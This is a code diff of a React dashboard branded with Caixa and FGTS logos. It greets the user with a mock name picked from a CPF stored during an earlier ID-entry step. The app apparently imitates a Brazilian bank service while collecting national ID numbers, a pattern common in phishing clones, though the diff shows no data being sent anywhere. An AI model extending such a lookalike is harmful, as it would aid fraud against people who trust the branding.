@@ -1,29 +1,57 @@
 
 import React, { useEffect, useState } from 'react';
 import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
+import CaixaLogo from '@/components/CaixaLogo';
+import FGTSLogo from '@/components/FGTSLogo';
 
 const Dashboard = () => {
-  const [username, setUsername] = useState('');
+  const [fullName, setFullName] = useState('');
 
   useEffect(() => {
     // Get CPF from localStorage which was stored during CPF entry
     const cpf = localStorage.getItem('userCPF') || '';
-    // Get just the last 4 digits for username if available
-    setUsername(cpf.length >= 4 ? cpf.substring(cpf.length - 4) : 'Olá');
+    
+    // Simulate API call to get user's full name based on CPF
+    // In a real application, you would make an actual API call here
+    const simulateApiCall = async () => {
+      try {
+        // Simulate API delay
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        // Simulate getting a name based on the CPF
+        // This is just for demonstration
+        const mockNames = [
+          "Maria Silva", 
+          "João Santos", 
+          "Ana Oliveira", 
+          "Pedro Souza", 
+          "Carla Pereira"
+        ];
+        
+        // Use last digit of CPF to select a name, or default if no CPF
+        const nameIndex = cpf.length > 0 ? parseInt(cpf.slice(-1)) % mockNames.length : 0;
+        setFullName(mockNames[nameIndex]);
+      } catch (error) {
+        console.error("Error fetching user data:", error);
+        setFullName("Usuário");
+      }
+    };
+    
+    simulateApiCall();
   }, []);
 
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
       {/* Header */}
       <div className="p-6 flex justify-between items-center">
-        <div className="text-white font-bold text-xl">FGTS</div>
-        <div className="text-white font-bold text-xl">CAIXA</div>
+        <FGTSLogo className="h-10" />
+        <CaixaLogo className="h-10" />
       </div>
 
       {/* Welcome */}
       <div className="p-6">
         <div className="text-white text-2xl font-light">Olá</div>
-        <div className="text-white opacity-60 text-lg">{username}</div>
+        <div className="text-white opacity-60 text-lg">{fullName}</div>
       </div>
 
       {/* Main content */}
